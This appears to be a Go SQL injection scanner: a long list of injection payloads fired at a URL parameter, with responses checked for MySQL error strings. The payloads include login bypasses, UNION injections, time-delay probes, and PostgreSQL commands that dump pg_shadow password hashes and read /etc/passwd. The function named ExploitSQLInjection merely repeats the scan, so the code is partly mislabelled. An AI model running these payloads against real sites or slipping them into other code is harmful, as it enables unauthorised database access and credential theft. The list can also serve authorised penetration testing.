package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

var plds = []string{
	// Lista de payloads
	"'",
	"''",
	"`",
	"``",
	",",
	"\"",
	"\"\"",
	"//",
	"\\",
	"\\\\",
	";",
	"' or \"",
	"-- or #",
	"' OR '1",
	"' OR 1 -- -",
	"\" OR \"\" = \"",
	"\" OR 1 = 1 -- -",
	"' OR '' = '",
	"'='",
	"'LIKE'",
	"=0--+",
	" OR 1=1",
	"' OR 'x'='x",
	"' AND id IS NULL; --",
	"'''''''''''''UNION SELECT '2",
	"%00",
	"/*…*/",
	"+",
	"||",
	"%",
	"@variable",
	"@@variable",
	"AND 1",
	"AND 0",
	"AND true",
	"AND false",
	"1-false",
	"1-true",
	"1*56",
	"-2",
	"1' ORDER BY 1--+",
	"1' ORDER BY 2--+",
	"1' ORDER BY 3--+",
	"1' ORDER BY 1,2--+",
	"1' ORDER BY 1,2,3--+",
	"1' GROUP BY 1,2,--+",
	"1' GROUP BY 1,2,3--+",
	"' GROUP BY columnnames having 1=1 --",
	"-1' UNION SELECT 1,2,3--+",
	"' UNION SELECT sum(columnname ) from tablename --",
	"-1 UNION SELECT 1 INTO @,@",
	"-1 UNION SELECT 1 INTO @,@,@",
	"1 AND (SELECT * FROM Users) = 1",
	"' AND MID(VERSION(),1,1) = '5';",
	"' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
	",(select * from (select(sleep(10)))a)",
	"%2c(select%20*%20from%20(select(sleep(10)))a)",
	"';WAITFOR DELAY '0:0:30'--",
	"#",
	"/*",
	"-- -",
	";%00",
	"`",
	"'-'",
	"' '",
	"'&'",
	"'^'",
	"'*'",
	"' or ''-'",
	"' or '' '",
	"' or ''&'",
	"' or ''^'",
	"' or ''*'",
	"\"-\"",
	"\" \"",
	"\"&\"",
	"\"^\"",
	"\"*\"",
	"\" or \"\"-\"",
	"\" or \"\" \"",
	"\" or \"\"&\"",
	"\" or \"\"^\"",
	"\" or \"\"*\"",
	"or true--",
	"\" or true--",
	"' or true--",
	"\") or true--",
	"') or true--",
	"' or 'x'='x",
	"') or ('x')=('x",
	"')) or (('x'))=(('x",
	"\" or \"x\"=\"x",
	"\") or (\"x\")=(\"x",
	"\")) or ((\"x\"))=((\"x",
	"or 1=1",
	"or 1=1--",
	"or 1=1#",
	"or 1=1/*",
	"admin' --",
	"admin' #",
	"admin'/*",
	"admin' or '1'='1",
	"admin' or '1'='1'--",
	"admin' or '1'='1'#",
	"admin' or '1'='1'/*",
	"admin'or 1=1 or ''='",
	"admin' or 1=1",
	"admin' or 1=1--",
	"admin' or 1=1#",
	"admin' or 1=1/*",
	"admin') or ('1'='1",
	"admin') or ('1'='1'--",
	"admin') or ('1'='1'#",
	"admin') or ('1'='1'/*",
	"admin') or '1'='1",
	"admin') or '1'='1'--",
	"admin') or '1'='1'#",
	"admin') or '1'='1'/*",
	"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
	"admin\" --",
	"admin\" #",
	"admin\"/*",
	"admin\" or \"1\"=\"1",
	"admin\" or \"1\"=\"1\"--",
	"admin\" or \"1\"=\"1\"#",
	"admin\" or \"1\"=\"1\"/*",
	"admin\"or 1=1 or \"\"=\"",
	"admin\" or 1=1",
	"admin\" or 1=1--",
	"admin\" or 1=1#",
	"admin\" or 1=1/*",
	"admin\") or (\"1\"=\"1",
	"admin\") or (\"1\"=\"1\"--",
	"admin\") or (\"1\"=\"1\"#",
	"admin\") or (\"1\"=\"1\"/*",
	"admin\") or \"1\"=\"1",
	"admin\") or \"1\"=\"1\"--",
	"admin\") or \"1\"=\"1\"#",
	"admin\") or \"1\"=\"1\"/*",
	"1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
	"select version();",
	"select current_database();",
	"select current_user;",
	"select session_user;",
	"select current_setting('log_connections');",
	"select current_setting('log_statement');",
	"select current_setting('port');",
	"select current_setting('password_encryption');",
	"select current_setting('krb_server_keyfile');",
	"select current_setting('virtual_host');",
	"select current_setting('port');",
	"select current_setting('config_file');",
	"select current_setting('hba_file');",
	"select current_setting('data_directory');",
	"select * from pg_shadow;",
	"select * from pg_group;",
	"create table myfile (input TEXT);",
	"copy myfile from '/etc/passwd';",
	"select * from myfile;",
	"copy myfile to /tmp/test;",
}

func ScanURLForSQLInjection(url string) bool {
	for _, payload := range plds {
		testURL := fmt.Sprintf("%s?param=%s", url, payload)
		resp, err := http.Get(testURL)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		fmt.Printf("Payload: %s\nResponse:\n%s\n", payload, string(body))

		if strings.Contains(string(body), "SQL syntax") ||
			strings.Contains(string(body), "mysql_fetch") ||
			strings.Contains(string(body), "You have an error in your SQL syntax") {
			return true
		}
	}
	return false
}

func ExploitSQLInjection(url string) bool {
	for _, pld := range plds {
		testURL := fmt.Sprintf("%s?param=%s", url, pld)
		resp, err := http.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		if strings.Contains(string(body), "SQL syntax") ||
			strings.Contains(string(body), "mysql_fetch") ||
			strings.Contains(string(body), "You have an error in your SQL syntax") {
			return true
		}
	}
	return false
}
